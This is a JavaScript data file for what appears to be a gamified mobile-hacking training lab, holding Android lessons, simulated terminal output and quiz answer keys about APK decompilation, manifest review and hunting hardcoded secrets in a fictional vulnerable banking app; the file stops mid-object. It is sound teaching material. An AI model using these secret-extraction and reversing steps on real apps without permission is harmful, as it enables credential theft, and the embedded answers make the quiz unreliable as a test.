/* =====================================================================
   MobileHack Lab — Lab Content Data
   ===================================================================== */

const RANKS = [
  { name: 'NOVICE',        minXP: 0    },
  { name: 'STUDENT',       minXP: 200  },
  { name: 'HACKER',        minXP: 600  },
  { name: 'ELITE HACKER',  minXP: 1400 },
  { name: 'MASTER',        minXP: 3000 },
];

const ACHIEVEMENTS = [
  { id: 'first_blood',   name: 'First Blood',      icon: '🩸', desc: 'Complete your first task' },
  { id: 'android_init',  name: 'Android Init',     icon: '🤖', desc: 'Start the Android path' },
  { id: 'apk_cracker',   name: 'APK Cracker',      icon: '📦', desc: 'Decompile your first APK' },
  { id: 'frida_master',  name: 'Frida Master',     icon: '🪄', desc: 'Complete Frida module' },
  { id: 'ios_init',      name: 'iOS Init',         icon: '🍎', desc: 'Start the iOS path' },
  { id: 'net_sniffer',   name: 'Network Sniffer',  icon: '🕸️', desc: 'Complete Network path' },
  { id: 'ctf_1',         name: 'Flag Planter',     icon: '🚩', desc: 'Solve your first CTF' },
  { id: 'ctf_5',         name: 'CTF Veteran',      icon: '🏆', desc: 'Solve 5 CTF challenges' },
  { id: 'speedrun',      name: 'Speedrunner',      icon: '⚡', desc: 'Complete a room in one session' },
  { id: 'completionist', name: 'Completionist',    icon: '💯', desc: 'Finish all learning paths' },
];

/* ── Learning Paths ──────────────────────────────────────────────────── */
const PATHS = {
  android: {
    id: 'android',
    title: 'Android Hacking',
    subtitle: 'From APK to Root',
    icon: 'fab fa-android',
    color: '#3ddc84',
    bgGradient: 'linear-gradient(135deg,#0d2218,#0a1a12)',
    description: 'Master Android security testing from zero to advanced. Learn APK analysis, dynamic instrumentation with Frida, vulnerability exploitation, and bypass techniques.',
    difficulty: 'Beginner → Advanced',
    duration: '12-16 hours',
    rooms: 7,
    rooms_list: ['android-fundamentals','android-apk-analysis','android-static','android-dynamic','android-frida','android-vulns','android-advanced'],
  },
  ios: {
    id: 'ios',
    title: 'iOS Hacking',
    subtitle: 'Breaking the Walled Garden',
    icon: 'fab fa-apple',
    color: '#a0c4ff',
    bgGradient: 'linear-gradient(135deg,#0d1829,#0a1220)',
    description: 'Explore iOS application security, IPA analysis, runtime manipulation, Frida hooking, and bypassing iOS security controls including jailbreak detection.',
    difficulty: 'Intermediate → Advanced',
    duration: '8-12 hours',
    rooms: 5,
    rooms_list: ['ios-fundamentals','ios-ipa-analysis','ios-runtime','ios-bypasses','ios-advanced'],
  },
  network: {
    id: 'network',
    title: 'Mobile Network Analysis',
    subtitle: 'Intercept & Manipulate',
    icon: 'fas fa-network-wired',
    color: '#a855f7',
    bgGradient: 'linear-gradient(135deg,#140d29,#0d0a20)',
    description: 'Set up MitM proxies, intercept mobile HTTPS traffic, bypass certificate pinning, and test mobile API security using Burp Suite and custom scripts.',
    difficulty: 'Beginner → Intermediate',
    duration: '5-8 hours',
    rooms: 3,
    rooms_list: ['network-setup','network-pinning','network-api'],
  },
};

/* ── Rooms ───────────────────────────────────────────────────────────── */
const ROOMS = {

  /* ══════════════════════════════════════════════════════════════════
     ANDROID PATH
     ══════════════════════════════════════════════════════════════════ */

  'android-fundamentals': {
    id: 'android-fundamentals',
    path: 'android',
    title: 'Android Fundamentals',
    description: 'Learn Android architecture, application components, permissions, and set up your hacking environment.',
    difficulty: 'beginner',
    xpReward: 150,
    iconClass: 'fab fa-android',
    iconBg: 'rgba(61,220,132,.12)',
    iconColor: '#3ddc84',
    tasks: [
      {
        id: 't1', title: 'Introduction to Android Security',
        xp: 10,
        content: `
<h2>Welcome to Android Security</h2>
<p>Android is the world's most widely used mobile operating system, powering over <strong>3 billion</strong> active devices. This massive attack surface makes Android security one of the most critical areas in cybersecurity.</p>
<h3>Why Mobile Security Matters</h3>
<ul>
  <li>Mobile apps handle sensitive data: banking, health, communications</li>
  <li>Always-on devices with GPS, camera, microphone access</li>
  <li>Large variety of app stores including unvetted third-party stores</li>
  <li>Many developers lack security training</li>
</ul>
<h3>Android Security Model</h3>
<p>Android uses a <strong>Linux kernel</strong> at its core with a layered security architecture:</p>
<ul>
  <li><strong>Application Sandbox</strong> — each app runs in its own process with a unique UID</li>
  <li><strong>Permission System</strong> — apps must declare and request permissions</li>
  <li><strong>SELinux</strong> — Mandatory Access Control policies</li>
  <li><strong>Verified Boot</strong> — ensures OS integrity on startup</li>
  <li><strong>Google Play Protect</strong> — scans apps for malware</li>
</ul>
<div class="info-box"><i class="fas fa-info-circle"></i> <strong>Tip:</strong> Type <code>help</code> in the terminal to see available commands for this task.</div>
<h3>OWASP Mobile Top 10</h3>
<p>The OWASP Mobile Top 10 defines the most critical mobile security risks:</p>
<ol>
  <li>M1 — Improper Platform Usage</li>
  <li>M2 — Insecure Data Storage</li>
  <li>M3 — Insecure Communication</li>
  <li>M4 — Insecure Authentication</li>
  <li>M5 — Insufficient Cryptography</li>
  <li>M6 — Insecure Authorization</li>
  <li>M7 — Client Code Quality</li>
  <li>M8 — Code Tampering</li>
  <li>M9 — Reverse Engineering</li>
  <li>M10 — Extraneous Functionality</li>
</ol>`,
        terminalCommands: {
          'help': `Available commands:\n  help          Show this help\n  whoami        Show current user\n  uname -a      System information\n  cat /etc/os-release  OS details\n  clear         Clear terminal`,
          'whoami': 'attacker',
          'uname -a': 'Linux mobilehack 6.1.0-kali #1 SMP Debian x86_64 GNU/Linux',
          'cat /etc/os-release': 'NAME="Kali GNU/Linux"\nVERSION="2024.1"\nID=kali\nPRETTY_NAME="Kali GNU/Linux 2024.1"',
          'date': new Date().toString(),
        },
        questions: [
          { q: 'What UID-based mechanism isolates Android apps from each other?', a: 'sandbox', hint: 'Each app runs in its own ____ with a unique UID', xp: 10 },
          { q: 'What is the number of OWASP Mobile Top 10 categories?', a: '10', hint: 'Count them in the list above', xp: 5 },
        ],
      },
      {
        id: 't2', title: 'Android Architecture',
        xp: 20,
        content: `
<h2>Android Architecture Deep Dive</h2>
<p>Understanding Android's layered architecture is essential for finding attack surfaces at each level.</p>
<h3>Architecture Layers (Bottom to Top)</h3>
<ul>
  <li><strong>Linux Kernel</strong> — Hardware abstraction, memory management, process isolation, device drivers</li>
  <li><strong>Hardware Abstraction Layer (HAL)</strong> — Standard interface between hardware and framework</li>
  <li><strong>Native Libraries</strong> — libc, WebKit, SQLite, OpenGL/ES written in C/C++</li>
  <li><strong>Android Runtime (ART)</strong> — Executes DEX bytecode (replaced Dalvik in Android 5.0)</li>
  <li><strong>Java API Framework</strong> — The building blocks for Android apps</li>
  <li><strong>System Apps</strong> — Pre-installed apps with elevated privileges</li>
</ul>
<h3>Application Components</h3>
<p>Every Android app is built from four fundamental building blocks:</p>
<ul>
  <li><strong>Activity</strong> — A single screen with a UI. Entry point for user interaction.</li>
  <li><strong>Service</strong> — Background long-running operations (e.g., music player, network sync)</li>
  <li><strong>BroadcastReceiver</strong> — Responds to system-wide broadcast announcements</li>
  <li><strong>ContentProvider</strong> — Manages shared data accessible by other apps via URIs</li>
</ul>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> <strong>Security Note:</strong> Exported components (accessible by other apps) are a major attack surface. Always check <code>android:exported="true"</code> in the manifest.</div>
<h3>Intents — The Messaging System</h3>
<p>Intents are messages that allow components to interact:</p>
<ul>
  <li><strong>Explicit Intent</strong> — directly targets a specific component by name</li>
  <li><strong>Implicit Intent</strong> — declares a general action; system finds the right component</li>
</ul>
<pre><code># Example: Starting an activity via ADB using an intent
adb shell am start -n com.example.app/.MainActivity
adb shell am start -a android.intent.action.VIEW -d "https://example.com"</code></pre>`,
        terminalCommands: {
          'help': 'Available commands:\n  adb shell am start  Launch components\n  adb shell dumpsys   Dump system info\n  adb shell pm list packages  List apps\n  adb devices         List connected devices',
          'adb devices': 'List of devices attached\nemulator-5554\tdevice',
          'adb shell am start -n com.example.app/.MainActivity': 'Starting: Intent { cmp=com.example.app/.MainActivity }\nWarning: Activity not started, its current task has been brought to the front',
          'adb shell pm list packages': `package:com.android.settings\npackage:com.android.chrome\npackage:com.vulnerable.bankapp\npackage:com.example.app\npackage:com.android.vending`,
          'adb shell dumpsys activity activities | head -20': `ACTIVITY MANAGER ACTIVITIES\n  Running activities (most recent first):\n    TaskRecord{12ab com.example.app}:\n      Run #0: ActivityRecord{5bc MainActivity}`,
        },
        questions: [
          { q: 'Which Android component handles background long-running operations?', a: 'service', hint: 'Not an Activity, not a Receiver...', xp: 10 },
          { q: 'What attribute in AndroidManifest.xml makes a component accessible by other apps?', a: 'android:exported', hint: 'Check the warning box above', xp: 15 },
        ],
      },
      {
        id: 't3', title: 'APK File Structure',
        xp: 25,
        content: `
<h2>Understanding the APK Format</h2>
<p>An <strong>APK (Android Package Kit)</strong> is simply a ZIP archive containing all files needed to run an Android app. Understanding its structure is the first step in reverse engineering.</p>
<h3>APK Contents</h3>
<ul>
  <li><code>AndroidManifest.xml</code> — Binary XML declaring app components, permissions, metadata</li>
  <li><code>classes.dex</code> — Compiled Dalvik Executable (DEX) bytecode — the actual app code</li>
  <li><code>classes2.dex</code> — Additional DEX (multidex apps)</li>
  <li><code>resources.arsc</code> — Compiled resources (strings, layouts, dimensions)</li>
  <li><code>res/</code> — Resource files (XML layouts, images, drawables)</li>
  <li><code>assets/</code> — Raw files bundled with the app (databases, config files)</li>
  <li><code>lib/</code> — Native shared libraries (.so files)</li>
  <li><code>META-INF/</code> — Signature and certificate information</li>
</ul>
<div class="info-box"><i class="fas fa-lightbulb"></i> Since APK is a ZIP, you can use <code>unzip</code> directly to extract it!</div>
<h3>DEX Bytecode</h3>
<p>Android code is compiled to <strong>DEX (Dalvik Executable)</strong> format, which the ART runtime executes. Unlike native code, DEX can be decompiled back to Java-like source code with tools like <strong>jadx</strong>.</p>
<h3>Native Libraries</h3>
<p>Located in <code>lib/</code>, organized by CPU architecture:</p>
<ul>
  <li><code>arm64-v8a/</code> — 64-bit ARM (modern phones)</li>
  <li><code>armeabi-v7a/</code> — 32-bit ARM (older phones)</li>
  <li><code>x86/</code>, <code>x86_64/</code> — Emulators and some tablets</li>
</ul>`,
        terminalCommands: {
          'help': 'Try: unzip, file, ls, cat commands',
          'file target.apk': 'target.apk: Zip archive data, at least v2.0 to extract',
          'unzip target.apk -d target_out/': `Archive:  target.apk\n  inflating: target_out/AndroidManifest.xml\n  inflating: target_out/classes.dex\n  inflating: target_out/classes2.dex\n  inflating: target_out/resources.arsc\n   creating: target_out/res/\n   creating: target_out/lib/\n  inflating: target_out/lib/arm64-v8a/libnative.so\n  inflating: target_out/lib/armeabi-v7a/libnative.so\n   creating: target_out/assets/\n  inflating: target_out/assets/config.json\n   creating: target_out/META-INF/\n  inflating: target_out/META-INF/CERT.RSA`,
          'ls target_out/': 'AndroidManifest.xml  assets/  classes.dex  classes2.dex  lib/  META-INF/  res/  resources.arsc',
          'ls target_out/lib/': 'arm64-v8a/  armeabi-v7a/',
          'ls target_out/lib/arm64-v8a/': 'libnative.so',
          'cat target_out/assets/config.json': '{\n  "api_endpoint": "http://api.vulnerable-bank.com/v1",\n  "debug_mode": true,\n  "log_level": "verbose"\n}',
          'ls target_out/META-INF/': 'CERT.RSA  CERT.SF  MANIFEST.MF',
        },
        questions: [
          { q: 'What file extension do compiled Android bytecode files use?', a: 'dex', hint: 'Dalvik EXecutable — check classes.___', xp: 10 },
          { q: 'In which directory are native .so libraries stored inside an APK?', a: 'lib', hint: 'Check the APK contents list', xp: 10 },
          { q: 'What was found in assets/config.json that is a security risk?', a: 'debug_mode', hint: 'Look at the JSON output carefully', xp: 15 },
        ],
      },
      {
        id: 't4', title: 'Android Permissions',
        xp: 20,
        content: `
<h2>Android Permission System</h2>
<p>Android's permission model controls what resources an app can access. Misuse of permissions is a major security category (OWASP M1).</p>
<h3>Permission Categories</h3>
<ul>
  <li><strong>Normal</strong> — Granted automatically (e.g., INTERNET, VIBRATE)</li>
  <li><strong>Dangerous</strong> — Requires explicit user approval at runtime (e.g., CAMERA, READ_CONTACTS, ACCESS_FINE_LOCATION)</li>
  <li><strong>Signature</strong> — Only granted to apps signed with the same certificate</li>
  <li><strong>SignatureOrSystem</strong> — Granted to system apps or same-cert apps</li>
</ul>
<h3>Dangerous Permissions to Watch For</h3>
<pre><code>android.permission.READ_SMS          # Read SMS messages
android.permission.SEND_SMS          # Send SMS (premium rate!)
android.permission.READ_CONTACTS     # Access contact list
android.permission.ACCESS_FINE_LOCATION  # GPS location
android.permission.RECORD_AUDIO     # Microphone access
android.permission.READ_CALL_LOG    # Call history
android.permission.CAMERA           # Camera access
android.permission.READ_EXTERNAL_STORAGE  # Files on SD card</code></pre>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> A flashlight app requesting READ_SMS and ACCESS_FINE_LOCATION is a <strong>red flag</strong>.</div>
<h3>Custom Permissions</h3>
<p>Apps can define their own permissions to protect components from unauthorized access. If a custom permission uses <code>android:protectionLevel="normal"</code>, any app can request it.</p>`,
        terminalCommands: {
          'help': 'Try: adb shell pm, grep on manifest',
          'adb shell pm list permissions -d': `dangerous permissions:\n  android.permission.READ_CALENDAR\n  android.permission.WRITE_CALENDAR\n  android.permission.CAMERA\n  android.permission.READ_CONTACTS\n  android.permission.WRITE_CONTACTS\n  android.permission.GET_ACCOUNTS\n  android.permission.ACCESS_FINE_LOCATION\n  android.permission.ACCESS_COARSE_LOCATION\n  android.permission.RECORD_AUDIO\n  android.permission.READ_PHONE_STATE\n  android.permission.CALL_PHONE\n  android.permission.READ_CALL_LOG\n  android.permission.WRITE_CALL_LOG\n  android.permission.READ_SMS\n  android.permission.SEND_SMS\n  android.permission.READ_EXTERNAL_STORAGE\n  android.permission.WRITE_EXTERNAL_STORAGE`,
          'adb shell pm list permissions -g -d': 'grouping dangerous permissions by group...\nphone / android.permission.READ_PHONE_STATE\nlocation / android.permission.ACCESS_FINE_LOCATION\nsms / android.permission.READ_SMS\ncamera / android.permission.CAMERA',
          'adb shell dumpsys package com.vulnerable.bankapp | grep permission': `  requested permissions:\n    android.permission.INTERNET\n    android.permission.ACCESS_FINE_LOCATION\n    android.permission.READ_SMS\n    android.permission.READ_CONTACTS\n    android.permission.CAMERA\n    android.permission.RECORD_AUDIO\n    android.permission.READ_EXTERNAL_STORAGE`,
        },
        questions: [
          { q: 'Which permission category requires the user to explicitly approve access at runtime?', a: 'dangerous', hint: 'There are normal, ___, signature...', xp: 10 },
          { q: 'What permission lets an app read SMS messages?', a: 'READ_SMS', hint: 'android.permission.____', xp: 15 },
        ],
      },
      {
        id: 't5', title: 'Setting Up the Lab',
        xp: 30,
        content: `
<h2>Building Your Android Hacking Lab</h2>
<p>A proper mobile security lab is essential. Here's the recommended setup.</p>
<h3>Required Tools</h3>
<ul>
  <li><strong>Kali Linux</strong> (or ParrotOS) — your attack machine</li>
  <li><strong>Android Emulator</strong> (AVD or Genymotion) — rooted Android instance</li>
  <li><strong>ADB</strong> — Android Debug Bridge (comes with Android SDK platform-tools)</li>
  <li><strong>APKTool</strong> — APK decompilation and reassembly</li>
  <li><strong>JADX</strong> — Decompile DEX to Java source</li>
  <li><strong>MobSF</strong> — Automated static/dynamic analysis</li>
  <li><strong>Frida</strong> — Dynamic instrumentation toolkit</li>
  <li><strong>Objection</strong> — Runtime mobile exploration powered by Frida</li>
  <li><strong>Burp Suite</strong> — HTTP/HTTPS interception proxy</li>
</ul>
<h3>Quick Install (Kali)</h3>
<pre><code># Install ADB and platform tools
sudo apt install adb android-sdk-platform-tools -y

# Install APKTool
sudo apt install apktool -y

# Install JADX
sudo apt install jadx -y

# Install Frida and Objection via pip
pip3 install frida-tools objection

# Install MobSF (Docker)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</code></pre>
<div class="success-box"><i class="fas fa-check-circle"></i> <strong>Recommended:</strong> Use a rooted Android 9 (API 28) emulator for maximum tool compatibility.</div>
<h3>Verify ADB Connection</h3>
<pre><code>adb start-server
adb devices
adb shell whoami   # Should return: root (on rooted device/emulator)</code></pre>`,
        terminalCommands: {
          'help': 'Try the setup commands shown above',
          'adb start-server': '* daemon not running; starting now at tcp:5037\n* daemon started successfully',
          'adb devices': 'List of devices attached\nemulator-5554\tdevice',
          'adb shell whoami': 'root',
          'adb shell getprop ro.build.version.release': '9',
          'adb shell getprop ro.build.version.sdk': '28',
          'frida --version': '16.2.1',
          'objection version': 'objection: 1.11.0',
          'apktool --version': 'Apktool 2.9.3',
          'jadx --version': 'jadx version: 1.4.7',
          'python3 -c "import frida; print(frida.__version__)"': '16.2.1',
        },
        questions: [
          { q: 'What tool is used to decompile APK smali back to human-readable Java source?', a: 'jadx', hint: 'It starts with J...', xp: 15 },
          { q: 'What port does ADB use by default?', a: '5037', hint: 'Check the adb start-server output', xp: 15 },
        ],
      },
    ],
  },

  'android-apk-analysis': {
    id: 'android-apk-analysis',
    path: 'android',
    title: 'APK Analysis & Reversing',
    description: 'Use APKTool, JADX, and grep to decompile, analyse manifests, and extract secrets from Android apps.',
    difficulty: 'beginner',
    xpReward: 200,
    iconClass: 'fas fa-cube',
    iconBg: 'rgba(251,191,36,.12)',
    iconColor: '#fbbf24',
    tasks: [
      {
        id: 't1', title: 'APKTool Decompilation',
        xp: 25,
        content: `
<h2>APKTool — Decoding APKs</h2>
<p><strong>APKTool</strong> decodes APK resources to their near-original form. It converts binary XML back to human-readable XML and DEX bytecode to <strong>Smali</strong> (an assembly-like representation of DEX).</p>
<h3>Basic Usage</h3>
<pre><code># Decode (decompile) an APK
apktool d target.apk -o target_decoded/

# Decode without decoding resources (faster)
apktool d target.apk -o target_decoded/ --no-res

# Rebuild after modification (for patching)
apktool b target_decoded/ -o patched.apk</code></pre>
<h3>Output Structure</h3>
<ul>
  <li><code>AndroidManifest.xml</code> — Human-readable manifest</li>
  <li><code>smali/</code> — Smali bytecode (one file per class)</li>
  <li><code>smali_classes2/</code> — If multidex</li>
  <li><code>res/</code> — Decoded XML resources, images</li>
  <li><code>apktool.yml</code> — APKTool metadata for rebuilding</li>
</ul>
<div class="info-box"><i class="fas fa-info-circle"></i> Smali uses register-based instructions. Method calls look like <code>invoke-virtual {v0, v1}, Lcom/example/Foo;->bar(I)V</code></div>`,
        terminalCommands: {
          'help': 'Try: apktool d target.apk -o target_decoded/',
          'apktool d target.apk -o target_decoded/': `I: Using Apktool 2.9.3 on target.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: 1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Baksmaling classes2.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\nI: ----- Done ------`,
          'ls target_decoded/': 'AndroidManifest.xml  apktool.yml  assets/  lib/  original/  res/  smali/  smali_classes2/',
          'cat target_decoded/apktool.yml': `!!brut.androlib.meta.MetaInfo\napkFileName: target.apk\napkInfo:\n  compressionType: false\n  doNotCompress:\n  - arsc\n  isFrameworkApk: false\n  packageId: '0x7f'\n  packageInfo:\n    forcedPackageId: '0x7f'\nsdkInfo:\n  minSdkVersion: '21'\n  targetSdkVersion: '33'\nversion: 2.9.3`,
          'ls target_decoded/smali/com/vulnerable/bankapp/': 'BuildConfig.smali  LoginActivity.smali  MainActivity.smali  NetworkHelper.smali  DatabaseHelper.smali  Utils.smali',
          'cat target_decoded/smali/com/vulnerable/bankapp/LoginActivity.smali': `.class public Lcom/vulnerable/bankapp/LoginActivity;\n.super Landroidx/appcompat/app/AppCompatActivity;\n\n# static fields\n.field private static final TAG:Ljava/lang/String; = "LoginActivity"\n.field private static final HARDCODED_KEY:Ljava/lang/String; = "MyS3cr3tK3y"\n\n.method public onCreate(Landroid/os/Bundle;)V\n    .locals 3\n    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V\n    return-void\n.end method`,
        },
        questions: [
          { q: 'What is the assembly-like language used to represent DEX bytecode?', a: 'smali', hint: 'APKTool produces ___ files', xp: 15 },
          { q: 'What hardcoded value was found in LoginActivity.smali?', a: 'MyS3cr3tK3y', hint: 'Look at the HARDCODED_KEY field', xp: 20 },
        ],
      },
      {
        id: 't2', title: 'JADX — Java Source Recovery',
        xp: 30,
        content: `
<h2>JADX — Decompile to Java</h2>
<p><strong>JADX</strong> is the most powerful Android decompiler. It converts DEX bytecode directly to readable Java source code, making reverse engineering much easier than reading Smali.</p>
<h3>Usage</h3>
<pre><code># Decompile to a directory
jadx -d output/ target.apk

# Open the GUI (jadx-gui)
jadx-gui target.apk

# Decompile with debug info
jadx -d output/ --show-bad-code target.apk</code></pre>
<h3>What JADX Recovers</h3>
<ul>
  <li>Java class source code (all classes, methods, fields)</li>
  <li>Resources and assets</li>
  <li>String constants (including hardcoded secrets)</li>
  <li>AndroidManifest.xml in readable form</li>
</ul>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> Decompiled code won't compile back perfectly — it's for reading, not rebuilding. Use APKTool for patching.</div>
<h3>Searching for Secrets</h3>
<pre><code># Search for hardcoded passwords
grep -r "password" output/sources/ --include="*.java" -i

# Find API keys (common patterns)
grep -rE "(api_key|apikey|api-key|secret|token)" output/sources/ -i

# Find HTTP URLs (cleartext communication)
grep -rE "http://" output/sources/ -l</code></pre>`,
        terminalCommands: {
          'jadx -d output/ target.apk': `INFO  - loading ...\nINFO  - processing ...\nINFO  - done\nINFO  - output directory: output`,
          'ls output/': 'resources/  sources/',
          'ls output/sources/com/vulnerable/bankapp/': 'BuildConfig.java  DatabaseHelper.java  LoginActivity.java  MainActivity.java  NetworkHelper.java  Utils.java',
          'cat output/sources/com/vulnerable/bankapp/LoginActivity.java': `package com.vulnerable.bankapp;\n\npublic class LoginActivity extends AppCompatActivity {\n    private static final String TAG = "LoginActivity";\n    private static final String ADMIN_PASSWORD = "P@ssw0rd2024!";\n    private static final String API_KEY = "AIzaSy-abc123xyz789secret";\n    \n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_login);\n    }\n    \n    private boolean validatePin(String pin) {\n        return pin.equals("1234"); // TODO: move to server\n    }\n}`,
          'grep -r "password" output/sources/ -i': `output/sources/com/vulnerable/bankapp/LoginActivity.java:    private static final String ADMIN_PASSWORD = "P@ssw0rd2024!";\noutput/sources/com/vulnerable/bankapp/DatabaseHelper.java:    db.execSQL("SELECT * FROM users WHERE password='" + input + "'");`,
          'grep -rE "http://" output/sources/': `output/sources/com/vulnerable/bankapp/NetworkHelper.java:        String url = "http://api.vulnerable-bank.com/v1/transfer";\noutput/sources/com/vulnerable/bankapp/NetworkHelper.java:        String loginUrl = "http://api.vulnerable-bank.com/v1/login";`,
          'cat output/sources/com/vulnerable/bankapp/NetworkHelper.java': `package com.vulnerable.bankapp;\n\npublic class NetworkHelper {\n    private static final String BASE_URL = "http://api.vulnerable-bank.com/v1";\n    private static final String SECRET_TOKEN = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abc123";\n    \n    public void transferFunds(String amount, String to) {\n        // No certificate validation!\n        HttpURLConnection conn = (HttpURLConnection) new URL(BASE_URL + "/transfer").openConnection();\n    }\n}`,
        },
        questions: [
          { q: 'What is the hardcoded ADMIN_PASSWORD found in LoginActivity.java?', a: 'P@ssw0rd2024!', hint: 'Check the JADX output of LoginActivity.java', xp: 20 },
          { q: 'What insecure protocol is used in NetworkHelper.java?', a: 'http', hint: 'Look at the BASE_URL value...', xp: 15 },
        ],
      },
      {
        id: 't3', title: 'Manifest Analysis',
        xp: 25,
        content: `
<h2>AndroidManifest.xml Analysis</h2>
<p>The <code>AndroidManifest.xml</code> is one of the richest sources of security information in any Android app. It declares every component and how they are exposed.</p>
<h3>Security-Relevant Manifest Entries</h3>
<ul>
  <li><strong>Exported components</strong> — <code>android:exported="true"</code> = accessible by other apps</li>
  <li><strong>Backup allowed</strong> — <code>android:allowBackup="true"</code> = data can be extracted via ADB</li>
  <li><strong>Debuggable flag</strong> — <code>android:debuggable="true"</code> = can attach debugger (NEVER in production)</li>
  <li><strong>Network Security Config</strong> — cleartext traffic permissions</li>
  <li><strong>Intent filters</strong> — defines what intents an exported component handles</li>
  <li><strong>Deep links</strong> — custom URI schemes that can be invoked by any app</li>
</ul>
<h3>What to Look For</h3>
<pre><code># Find exported components
grep -n 'exported="true"' AndroidManifest.xml

# Check for debuggable flag
grep "debuggable" AndroidManifest.xml

# Check backup setting
grep "allowBackup" AndroidManifest.xml

# Find deep link schemes
grep -A 5 "android.intent.action.VIEW" AndroidManifest.xml</code></pre>`,
        terminalCommands: {
          'cat target_decoded/AndroidManifest.xml': `<?xml version="1.0" encoding="utf-8"?>\n<manifest package="com.vulnerable.bankapp" android:versionCode="10" android:versionName="1.0">\n\n    <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n\n    <application\n        android:allowBackup="true"\n        android:debuggable="true"\n        android:label="VulnBank"\n        android:networkSecurityConfig="@xml/network_security_config">\n\n        <activity android:name=".MainActivity" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.MAIN"/>\n                <category android:name="android.intent.category.LAUNCHER"/>\n            </intent-filter>\n        </activity>\n\n        <activity android:name=".AdminActivity" android:exported="true"/>\n\n        <activity android:name=".DeepLinkActivity" android:exported="true">\n            <intent-filter>\n                <action android:name="android.intent.action.VIEW"/>\n                <category android:name="android.intent.category.DEFAULT"/>\n                <category android:name="android.intent.category.BROWSABLE"/>\n                <data android:scheme="vulnbank" android:host="transfer"/>\n            </intent-filter>\n        </activity>\n\n        <provider\n            android:name=".UserDataProvider"\n            android:authorities="com.vulnerable.bankapp.provider"\n            android:exported="true"/>\n\n    </application>\n</manifest>`,
          'grep -n \'exported="true"\' target_decoded/AndroidManifest.xml': `11:        <activity android:name=".MainActivity" android:exported="true">\n19:        <activity android:name=".AdminActivity" android:exported="true"/>\n22:        <activity android:name=".DeepLinkActivity" android:exported="true">\n34:            android:exported="true"/>`,
          'grep "debuggable" target_decoded/AndroidManifest.xml': '        android:debuggable="true"',
          'grep "allowBackup" target_decoded/AndroidManifest.xml': '        android:allowBackup="true"',
          'grep -A 5 "android.intent.action.VIEW" target_decoded/AndroidManifest.xml': `            <intent-filter>\n                <action android:name="android.intent.action.VIEW"/>\n                <category android:name="android.intent.category.DEFAULT"/>\n                <category android:name="android.intent.category.BROWSABLE"/>\n                <data android:scheme="vulnbank" android:host="transfer"/>`,
        },
        questions: [
          { q: 'What exported component could give an attacker direct admin access?', a: 'AdminActivity', hint: 'Which Activity is exported without any intent-filter protection?', xp: 20 },
          { q: 'What custom URI scheme is registered by the app for deep links?', a: 'vulnbank', hint: 'Check the android:scheme attribute', xp: 15 },
          { q: 'What flag allows an attacker to back up all app data via ADB?', a: 'allowBackup', hint: 'android:___ = "true"', xp: 15 },
        ],
      },
      {
        id: 't4', title: 'Hardcoded Secrets Hunter',
        xp: 35,
        content: `
<h2>Finding Hardcoded Secrets</h2>
<p>Hardcoded secrets are a critical vulnerability (OWASP M5 & M2). Developers often embed credentials, API keys, and tokens directly in app code.</p>
<h3>Common Secret Locations</h3>
<ul>
  <li>Java/Kotlin source constants</li>
  <li><code>res/values/strings.xml</code></li>
  <li><code>assets/config.json</code>, <code>assets/keys.properties</code></li>
  <li>BuildConfig fields</li>
  <li>Native library strings (use <code>strings</code> command)</li>
  <li>Encrypted — but with key also in the app!</li>
</ul>
<h3>Hunting Techniques</h3>
<pre><code># Broad secret search
grep -rE "(password|passwd|secret|api.?key|token|credential|auth)" \\
  output/sources/ -i --include="*.java" -n

# AWS keys
grep -rE "AKIA[0-9A-Z]{16}" output/sources/

# Google API keys
grep -rE "AIza[0-9A-Za-z\\-_]{35}" output/sources/

# JWT tokens
grep -rE "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+" output/sources/

# Strings in native libs
strings output/lib/arm64-v8a/libnative.so | grep -E "[A-Za-z0-9+/]{32,}"</code></pre>
<div class="warning-box"><i class="fas fa-exclamation-triangle"></i> Always search <strong>both</strong> source code AND resource files — many devs think XML strings are safer.</div>`,
        terminalCommands: {
          'grep -rE "(password|secret|api.key|token)" output/sources/ -i -n': `output/sources/com/vulnerable/bankapp/LoginActivity.java:4:    private static final String ADMIN_PASSWORD = "P@ssw0rd2024!";\noutput/sources/com/vulnerable/bankapp/NetworkHelper.java:5:    private static final String SECRET_TOKEN = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abc123";\noutput/sources/com/vulnerable/bankapp/PaymentService.java:8:    private String paymentToken = "pk_live_abc123xyz789def456";\noutput/sources/com/vulnerable/bankapp/BuildConfig.java:3:    public static final String STRIPE_KEY = "sk_live_51Ht9Bq...";\noutput/sources/com/vulnerable/bankapp/AnalyticsHelper.java:2:    private final String ANALYTICS_SECRET = "GA-123456789-1";`,
          'cat output/resources/res/values/strings.xml': `<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <string name="app_name">VulnBank</string>\n    <string name="db_encryption_key">vuln_db_key_2024!</string>\n    <string name="firebase_project_id">vulnbank-prod</string>\n    <string name="server_base_url">http://api.vulnerable-bank.com</string>\n    <string name="admin_bypass_code">VULN{h4rdc0d3d_secr3ts_are_bad}</string>\n</resources>`,
          'grep -rE "AIza[0-9A-Za-z-_]{35}" output/sources/': 'output/sources/com/vulnerable/bankapp/MapsActivity.java:3:    private static final String MAPS_KEY = "AIzaSy-RealGoogleAPIkey1234567890abc";',
